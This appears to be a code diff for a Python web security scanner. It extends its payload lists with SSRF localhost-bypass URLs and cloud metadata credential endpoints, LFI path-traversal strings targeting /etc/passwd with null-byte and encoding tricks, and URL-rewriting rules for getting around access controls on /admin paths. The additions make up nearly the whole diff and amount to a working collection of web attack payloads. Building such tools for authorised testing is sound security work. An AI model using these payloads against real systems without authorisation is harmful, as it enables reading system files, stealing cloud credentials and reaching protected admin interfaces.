@@ -106,6 +106,20 @@ _SSRF_PAYLOADS = [
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "http://169.254.169.254/computeMetadata/v1/",
     "http://169.254.169.254/metadata/instance",
+    # Localhost bypass variants (alternative IPs, encodings, DNS)
+    "http://127.0.0.2",
+    "http://127.123.123.123",
+    "http://0x7f.1",
+    "http://0177.1",
+    "http://[0000:0000:0000:0000:0000:0000:0000:0001]",
+    "http://[::ffff:127.0.0.1]",
+    "http://test.localtest.me",
+    # URL-encoded localhost bypass
+    "http://%31%32%37%2e%30%2e%30%2e%31",
+    "http://%6c%6f%63%61%6c%68%6f%73%74",
+    # Mixed notation bypass (hex + decimal + octal)
+    "http://0x7f.0.0.1",
+    "http://127.0x0.0x0.0x1",
 ]
 
 _SSRF_INDICATORS = re.compile(
@@ -414,6 +428,14 @@ _LFI_PAYLOADS_LINUX = [
     "/proc/self/fd/0",
     # Absolute path with encoding
     "%2fetc%2fpasswd",
+    # Advanced encoding bypasses from Web-Fuzzing-Box
+    "%00../../../../../../etc/passwd",                          # null byte prefix
+    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",      # UTF-8 overlong dot encoding
+    "..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd",               # backslash encoding
+    "%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..etc/passwd",  # double-encoded backslash
+    "..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",        # fully encoded path + file
+    "/./././././././././././etc/passwd",                        # repeated current-dir bypass
+    "....\\\\....\\\\....\\\\etc/passwd",                      # mixed backslash traversal
 ]
 
 _LFI_PAYLOADS_WINDOWS = [
@@ -1466,6 +1488,18 @@ _PATH_BYPASS_STRATEGIES = [
     # Double URL encoding
     lambda p: p.replace("/admin", "/%2e/admin"),
     lambda p: p.replace("/admin", "/admin%23"),
+    # API bypass techniques from Web-Fuzzing-Box
+    lambda p: p.replace("/admin", "/%2e%2e%2f/admin"),  # encoded ../
+    lambda p: p.replace("/admin", "/admin%00"),          # null byte
+    lambda p: p.replace("/admin", "/admin.json"),        # extension bypass
+    lambda p: p.replace("/admin", "/admin%26"),           # & char bypass
+    lambda p: p.replace("/admin", "/admin%3f"),           # ? char bypass
+    lambda p: p.replace("/admin", "/css/../admin"),       # static path prefix bypass
+    lambda p: p.replace("/admin", "/js/../admin"),        # static path prefix bypass
+    lambda p: p.replace("/admin", "/admin;aaa.js"),       # fake extension bypass
+    lambda p: p.replace("/admin", "/admin..%00/"),        # null in traversal
+    lambda p: p.replace("/admin", "/admin%0d/"),          # CR bypass
+    lambda p: p.replace("/admin", "/.%2e/admin"),         # mixed encoding traversal
 ]
 
 
